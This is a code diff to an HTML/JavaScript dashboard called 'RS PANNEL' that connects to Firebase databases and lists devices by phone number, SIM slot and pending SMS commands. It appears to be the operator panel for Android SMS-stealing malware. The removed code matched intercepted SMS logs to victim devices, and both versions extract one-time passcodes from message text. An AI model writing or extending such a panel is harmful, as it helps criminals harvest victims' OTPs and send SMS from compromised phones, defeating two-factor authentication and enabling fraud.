@@ -210,7 +210,7 @@
       width: 44px; height: 44px; border-radius: 14px; border: 1px solid #292b30;
       background: #1a1c20; display: grid; place-items: center; font-size: 20px; color: #555;
     }
-    .device-card .icon.online { color: var(--green); border-color: #086b4d; background: #08251e; box-shadow: 0 0 18px rgba(0,214,143,0.12); }
+    .device-card .icon.active { color: var(--green); border-color: #086b4d; background: #08251e; box-shadow: 0 0 18px rgba(0,214,143,0.12); }
     .device-card .info { flex: 1; min-width: 0; }
     .device-card .info .name { font-weight: 750; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
     .device-card .info .sub { font-size: 11px; color: #454850; margin-top: 4px; }
@@ -327,7 +327,7 @@
       <button class="btn-new" id="newConnBtn">＋ New Firebase Connection</button>
       <div id="homeError" class="error-text hidden"></div>
     </div>
-    <div class="footer-text">RS PANNEL · v7.0 · Clients + Messages</div>
+    <div class="footer-text">RS PANNEL · v8.0 · Root Reader</div>
   </div>
 </section>
 
@@ -340,11 +340,11 @@
       <div class="title">New Firebase Connection</div>
       <div class="form-group">
         <label>Friendly Label</label>
-        <input id="labelInput" placeholder="e.g. Rajabhaya" value="Rajabhaya">
+        <input id="labelInput" placeholder="e.g. Pikachu" value="Pikachu">
       </div>
       <div class="form-group">
         <label>Database URL</label>
-        <input id="urlInput" placeholder="https://project-default-rtdb.firebaseio.com" value="https://rajabhaya-default-rtdb.firebaseio.com">
+        <input id="urlInput" placeholder="https://project-default-rtdb.firebaseio.com" value="https://admin-panel-pikachu-default-rtdb.firebaseio.com">
       </div>
       <div class="form-group">
         <label>Web API Key</label>
@@ -355,7 +355,7 @@
         <button class="secondary" id="cancelBtn">Cancel</button>
       </div>
       <div id="setupError" class="error-text hidden"></div>
-      <div class="notice">📡 Reads /clients for devices and /messages for SMS — same as DARKX PANEL</div>
+      <div class="notice">📡 Reads root directly — works with your exact data</div>
     </div>
   </div>
 </section>
@@ -376,14 +376,13 @@
   </header>
   <div class="statsbar">
     <div class="stat-item"><small>TOTAL</small><strong id="totalStat">0</strong></div>
-    <div class="stat-item"><small>ONLINE</small><strong class="green" id="onlineStat">0</strong></div>
-    <div class="stat-item"><small>OFFLINE</small><strong id="offlineStat">0</strong></div>
-    <div class="stat-item"><small>SMS</small><strong class="cyan" id="smsStat">0</strong></div>
+    <div class="stat-item"><small>ACTIVE</small><strong class="green" id="activeStat">0</strong></div>
+    <div class="stat-item"><small>PENDING</small><strong class="cyan" id="pendingStat">0</strong></div>
   </div>
   <div class="filters">
     <button class="filter active" data-filter="all">All</button>
-    <button class="filter" data-filter="online">Online</button>
-    <button class="filter" data-filter="offline">Offline</button>
+    <button class="filter" data-filter="active">Active</button>
+    <button class="filter" data-filter="idle">Idle</button>
     <button class="sort" id="sortBtn">Sort ▲</button>
   </div>
   <main class="grid" id="deviceGrid"></main>
@@ -398,7 +397,7 @@
     </div>
     <div class="detail-grid" id="detailGrid"></div>
     <div class="sms-section">
-      <h3>📩 SMS Logs <span id="smsCountBadge" style="color:var(--cyan);font-size:12px;"></span></h3>
+      <h3>📩 Pending Command</h3>
       <div id="detailSmsList"></div>
     </div>
   </div>
@@ -491,7 +490,6 @@ function renderConnections() {
 // ─── FIREBASE CONNECTION ─────────────────────────────────────────────
 let firebaseReady = false;
 let devices = [];
-let allMessages = [];
 let currentFilter = 'all';
 let sortAsc = false;
 
@@ -532,106 +530,49 @@ function initFirebase(conn, apiKey) {
     const db = firebase.database();
     const status = $('statusLabel');
 
-    let clientData = {};
-    let msgData = {};
-    let clientsLoaded = false;
-    let msgsLoaded = false;
+    // ─── READ ROOT ──────────────────────────────────────────────────
+    const rootRef = db.ref('/');
+    const listener = rootRef.on('value', (snapshot) => {
+      const data = snapshot.val();
+      if (!data || typeof data !== 'object') {
+        devices = [];
+        renderGrid();
+        status.textContent = '● No data';
+        status.style.color = 'var(--danger)';
+        return;
+      }
 
-    // ─── READ /clients ──────────────────────────────────────────────
-    const clientsRef = db.ref('clients');
-    clientsRef.on('value', (snapshot) => {
-      clientData = snapshot.val() || {};
-      clientsLoaded = true;
-      buildDevices();
-    }, (err) => {
-      console.warn('Clients error:', err);
-      // Fallback: try /devices
-      db.ref('devices').on('value', (s) => {
-        clientData = s.val() || {};
-        clientsLoaded = true;
-        buildDevices();
-      });
-    });
-
-    // ─── READ /messages ─────────────────────────────────────────────
-    const msgRef = db.ref('messages');
-    msgRef.on('value', (snapshot) => {
-      msgData = snapshot.val() || {};
-      msgsLoaded = true;
-      allMessages = Object.values(msgData).filter(m => m && typeof m === 'object');
-      buildDevices();
-    }, (err) => {
-      console.warn('Messages error:', err);
-      // Fallback: try REST
-      setTimeout(() => {
-        if (!msgsLoaded) {
-          fetch(`${conn.databaseURL}/messages.json${apiKey ? '?auth='+apiKey : ''}`)
-            .then(res => res.json())
-            .then(data => {
-              if (data) { msgData = data; allMessages = Object.values(msgData).filter(m => m && typeof m === 'object'); msgsLoaded = true; buildDevices(); }
-            })
-            .catch(() => {});
-        }
-      }, 2000);
-    });
-
-    function buildDevices() {
-      if (!clientsLoaded || !msgsLoaded) return;
-
-      devices = Object.entries(clientData).map(([id, node]) => {
-        const online = node.status === true || node.online === true;
-        const battery = node.battery || node.batteryLevel || 'N/A';
-        const number = node.number || node.phoneNumber || node.phone || 'N/A';
-        const platform = node.platform || node.os || node.model || 'Android';
-        const network = node.network || node.carrier || node.operator || 'N/A';
-        const lastSeen = node.lastSeen || node.lastMessageTime || node.timestamp || Date.now();
-
-        // Find SMS for this device by matching sender with number
-        const deviceSms = allMessages.filter(s => {
-          const sender = (s.sender || s.from || s.number || '').toString().trim();
-          const num = number.toString().trim();
-          return sender && num && (sender.includes(num) || num.includes(sender));
-        });
-
+      devices = Object.entries(data).map(([id, node]) => {
+        const phone = node.phoneNumber || node.phone || '';
+        const message = node.messageText || node.sms?.message || node.command?.messageText || node.webhookEvent?.sendSms?.message || '';
+        const simSlot = node.simSlot ?? node.sms?.simSlot ?? node.command?.simSlot ?? 0;
+        const hasPending = !!message;
         return {
           id,
-          name: node.name || node.deviceName || node.label || id,
-          online,
-          battery,
-          number,
-          platform,
-          network,
-          lastSeen,
-          sms: deviceSms,
-          _raw: node
+          phone: phone || 'N/A',
+          message: message || null,
+          simSlot: simSlot,
+          hasPending,
+          raw: node
         };
       });
 
       status.textContent = `● Connected (${devices.length} devices)`;
       status.style.color = 'var(--green)';
       renderGrid();
-      const totalSms = devices.reduce((sum, d) => sum + d.sms.length, 0);
-      $('smsStat').textContent = totalSms;
-      showToast(`✅ ${devices.length} devices, ${totalSms} SMS`, 'success', 1500);
-    }
+      showToast(`Loaded ${devices.length} devices`, 'success', 1500);
+    }, (error) => {
+      console.error('Firebase read error:', error);
+      status.textContent = '● Error';
+      status.style.color = 'var(--danger)';
+      showToast('Permission denied or invalid DB', 'error');
+    });
 
-    window._unsub = () => {
-      clientsRef.off();
-      msgRef.off();
-    };
-
+    window._unsub = () => rootRef.off('value', listener);
   } catch(e) {
     console.error('Init error:', e);
     showToast('Init failed', 'error');
   }
-}
-
-// ─── OTP ─────────────────────────────────────────────────────────────
-function extractOTP(text) {
-  if (!text) return null;
-  const m = text.match(/\b\d{4,8}\b/g);
-  if (m) return m.sort((a,b) => a.length - b.length)[0];
-  return null;
 }
 
 // ─── SAVE CONNECTION ─────────────────────────────────────────────────
@@ -684,20 +625,20 @@ function renderGrid() {
   const q = $('searchInput').value.toLowerCase();
   let list = devices.filter(d => {
     const filterOk = currentFilter === 'all' ||
-                     (currentFilter === 'online' && d.online) ||
-                     (currentFilter === 'offline' && !d.online);
-    const searchOk = (d.id + ' ' + d.name + ' ' + d.number).toLowerCase().includes(q);
+                     (currentFilter === 'active' && d.hasPending) ||
+                     (currentFilter === 'idle' && !d.hasPending);
+    const searchOk = (d.id + ' ' + d.phone).toLowerCase().includes(q);
     return filterOk && searchOk;
   });
   list.sort((a,b) => {
-    const aTime = a.lastSeen || 0;
-    const bTime = b.lastSeen || 0;
+    const aTime = a.raw?.timestamp || a.raw?.lastSeen || 0;
+    const bTime = b.raw?.timestamp || b.raw?.lastSeen || 0;
     return sortAsc ? aTime - bTime : bTime - aTime;
   });
 
   $('totalStat').textContent = devices.length;
-  $('onlineStat').textContent = devices.filter(d => d.online).length;
-  $('offlineStat').textContent = devices.filter(d => !d.online).length;
+  $('activeStat').textContent = devices.filter(d => d.hasPending).length;
+  $('pendingStat').textContent = devices.filter(d => d.hasPending).length;
 
   const grid = $('deviceGrid');
   grid.innerHTML = '';
@@ -708,21 +649,20 @@ function renderGrid() {
   list.forEach(d => {
     const card = document.createElement('div');
     card.className = 'device-card';
-    const online = d.online;
-    const smsCount = d.sms ? d.sms.length : 0;
+    const hasPending = d.hasPending;
     card.innerHTML = `
       <div class="top">
-        <div class="icon ${online ? 'online' : ''}">${online ? '◉' : '◌'}</div>
+        <div class="icon ${hasPending ? 'active' : ''}">${hasPending ? '◉' : '◌'}</div>
         <div class="info">
-          <div class="name">${d.name}</div>
-          <div class="sub"><span>${d.id.slice(0,8)}…</span>${d.battery !== 'N/A' ? ' · 🔋 '+d.battery : ''}${smsCount > 0 ? ' · 📩 '+smsCount : ''}</div>
+          <div class="name">${d.id.slice(0, 16)}</div>
+          <div class="sub"><span>📞 ${d.phone}</span>${hasPending ? ' · 📩 pending' : ''}</div>
         </div>
       </div>
       <div class="details">
-        <div class="item"><small>PLATFORM</small><div>${d.platform}</div></div>
-        <div class="item"><small>STATUS</small><div>${online ? '<span class="online-dot"></span>Online' : '<span class="offline-dot"></span>Offline'}</div></div>
-        <div class="item"><small>NUMBER</small><div>${d.number}</div></div>
-        <div class="item"><small>NETWORK</small><div>${d.network}</div></div>
+        <div class="item"><small>ID</small><div>${d.id.slice(0, 8)}…</div></div>
+        <div class="item"><small>STATUS</small><div>${hasPending ? '<span class="online-dot"></span>Active' : '<span class="offline-dot"></span>Idle'}</div></div>
+        <div class="item"><small>SIM</small><div>${d.simSlot}</div></div>
+        <div class="item"><small>MESSAGE</small><div>${d.message ? d.message.slice(0, 20) + (d.message.length > 20 ? '…' : '') : '—'}</div></div>
       </div>
     `;
     card.addEventListener('click', () => showDetail(d));
@@ -734,49 +674,42 @@ function renderGrid() {
 function showDetail(device) {
   const modal = $('detailModal');
   modal.classList.add('active');
-  $('detailDeviceName').textContent = device.name || 'Device';
+  $('detailDeviceName').textContent = `Device: ${device.id.slice(0, 20)}`;
 
   const grid = $('detailGrid');
   grid.innerHTML = `
     <div class="detail-item"><div class="label">📱 ID</div><div class="value">${device.id}</div></div>
-    <div class="detail-item"><div class="label">📶 Status</div><div class="value" style="color:${device.online ? 'var(--green)' : 'var(--red)'}">${device.online ? 'Online' : 'Offline'}</div></div>
-    <div class="detail-item"><div class="label">📞 Number</div><div class="value">${device.number}</div></div>
-    <div class="detail-item"><div class="label">🌐 Network</div><div class="value">${device.network}</div></div>
-    <div class="detail-item"><div class="label">🤖 Platform</div><div class="value">${device.platform}</div></div>
-    <div class="detail-item"><div class="label">🔋 Battery</div><div class="value">${device.battery}</div></div>
-    <div class="detail-item"><div class="label">🕐 Last Seen</div><div class="value">${new Date(device.lastSeen).toLocaleString()}</div></div>
+    <div class="detail-item"><div class="label">📞 Phone</div><div class="value">${device.phone}</div></div>
+    <div class="detail-item"><div class="label">📶 Status</div><div class="value" style="color:${device.hasPending ? 'var(--green)' : 'var(--red)'}">${device.hasPending ? 'Active' : 'Idle'}</div></div>
+    <div class="detail-item"><div class="label">📲 SIM Slot</div><div class="value">${device.simSlot}</div></div>
   `;
 
   const smsList = $('detailSmsList');
   smsList.innerHTML = '';
-  const badge = $('smsCountBadge');
-  badge.textContent = `(${device.sms ? device.sms.length : 0} messages)`;
-
-  if (!device.sms || device.sms.length === 0) {
-    smsList.innerHTML = '<div style="color:#555963;padding:12px 0;">No SMS logs for this device</div>';
-    return;
-  }
-
-  const sorted = [...device.sms].reverse();
-  sorted.forEach(s => {
+  if (device.message) {
     const div = document.createElement('div');
     div.className = 'sms-item';
-    const body = s.body || s.message || s.text || '';
-    const from = s.sender || s.from || s.number || 'Unknown';
-    const time = s.dateTime || s.timestamp || s.time || '';
-    const otp = extractOTP(body);
     div.innerHTML = `
-      <div class="sms-header"><span>📨 ${from}</span><span>${time}</span></div>
-      <div class="sms-body">${body}</div>
-      ${otp ? `<div class="sms-otp">🔑 OTP: ${otp}</div>` : ''}
+      <div class="sms-header"><span>📨 Pending Command</span><span>SIM ${device.simSlot}</span></div>
+      <div class="sms-body">${device.message}</div>
+      ${extractOTP(device.message) ? `<div class="sms-otp">🔑 OTP: ${extractOTP(device.message)}</div>` : ''}
     `;
     smsList.appendChild(div);
-  });
+  } else {
+    smsList.innerHTML = '<div style="color:#555963;padding:12px 0;">No pending commands</div>';
+  }
+}
+
+function extractOTP(text) {
+  if (!text) return null;
+  const m = text.match(/\b\d{4,8}\b/g);
+  if (m) return m.sort((a,b) => a.length - b.length)[0];
+  return null;
 }
 
 // ─── INIT ─────────────────────────────────────────────────────────────
 renderConnections();
-console.log('[RS PANNEL] Ready — DARKX PANEL compatible');
+console.log('[RS PANNEL] Ready — root reader (final)');
 </script>
 </body>
 </html>
